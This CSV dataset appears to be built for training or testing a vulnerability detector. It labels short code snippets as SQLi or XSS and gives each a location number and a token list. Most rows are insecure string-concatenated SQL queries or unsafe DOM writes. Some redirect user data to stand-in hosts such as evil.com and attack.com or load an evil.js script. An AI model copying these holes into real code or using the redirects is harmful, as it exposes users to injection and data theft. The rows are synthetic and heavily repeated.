Code Snippet,Vulnerability Type,Location,Preprocessed Tokens
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,9,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,11,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,19,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,3,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,16,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,9,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,18,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,5,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,2,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,14,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,9,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,3,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,17,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,5,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,2,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,1,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
alert('Hello ' + user_input);,XSS,4,"[""alert('Hello"", ""'"", '+', 'user_input);']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,13,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,6,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,13,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,7,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,8,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,17,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,5,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
"document.write('<script src=""evil.js""></script>');",XSS,17,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,20,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
"document.write('<script src=""evil.js""></script>');",XSS,8,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,11,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,5,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,4,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
"document.write('<script src=""evil.js""></script>');",XSS,16,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,15,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,5,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.location = 'http://evil.com?username=' + user_input;,XSS,14,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,18,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,17,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
alert('Hello ' + user_input);,XSS,8,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.location = 'http://evil.com?username=' + user_input;,XSS,2,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,17,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,7,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,4,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
alert('Hello ' + user_input);,XSS,4,"[""alert('Hello"", ""'"", '+', 'user_input);']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,15,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,5,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,10,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,6,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,2,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
alert('Hello ' + user_input);,XSS,19,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.location = 'http://evil.com?username=' + user_input;,XSS,13,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,1,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,17,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.location = 'http://evil.com?username=' + user_input;,XSS,18,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,7,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.getElementById('input').innerHTML = user_input;,XSS,2,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,12,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,5,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,16,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,4,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,5,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,9,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,10,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,2,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,1,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,3,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,9,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,7,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,9,"[""alert('Hello"", ""'"", '+', 'user_input);']"
alert('Hello ' + user_input);,XSS,20,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,8,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,2,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,13,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,14,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,20,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
"document.write('<script src=""evil.js""></script>');",XSS,3,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
"document.write('<script src=""evil.js""></script>');",XSS,5,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
alert('Hello ' + user_input);,XSS,2,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.location = 'http://evil.com?username=' + user_input;,XSS,18,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,16,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,17,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,19,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,10,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,17,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,3,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
alert('Hello ' + user_input);,XSS,4,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,2,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,19,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,15,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,10,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,16,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
"document.write('<script src=""evil.js""></script>');",XSS,6,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,1,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,13,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,5,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,9,"[""alert('Hello"", ""'"", '+', 'user_input);']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,13,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,1,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,14,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.location = 'http://evil.com?username=' + user_input;,XSS,12,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,1,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,20,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,15,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,17,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,14,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,10,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,16,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,9,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,7,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,10,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,5,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
alert('Hello ' + user_input);,XSS,13,"[""alert('Hello"", ""'"", '+', 'user_input);']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,2,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,20,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,4,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,7,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,18,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,19,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,11,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,5,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,10,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,14,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,11,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,8,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,8,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,18,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,2,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,13,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,18,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,18,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,20,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,1,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,12,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,6,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,15,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,7,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
alert('Hello ' + user_input);,XSS,1,"[""alert('Hello"", ""'"", '+', 'user_input);']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,18,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,9,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.location = 'http://evil.com?username=' + user_input;,XSS,5,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,3,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,4,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,15,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,1,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,15,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,2,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,20,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,11,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,3,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,9,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,20,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
alert('Hello ' + user_input);,XSS,2,"[""alert('Hello"", ""'"", '+', 'user_input);']"
"document.write('<script src=""evil.js""></script>');",XSS,17,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
"document.write('<script src=""evil.js""></script>');",XSS,9,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,5,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,14,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
alert('Hello ' + user_input);,XSS,14,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.location = 'http://evil.com?username=' + user_input;,XSS,4,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,7,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,17,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,6,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,16,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,19,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,17,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,18,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
alert('Hello ' + user_input);,XSS,17,"[""alert('Hello"", ""'"", '+', 'user_input);']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,8,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,12,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,16,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,13,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
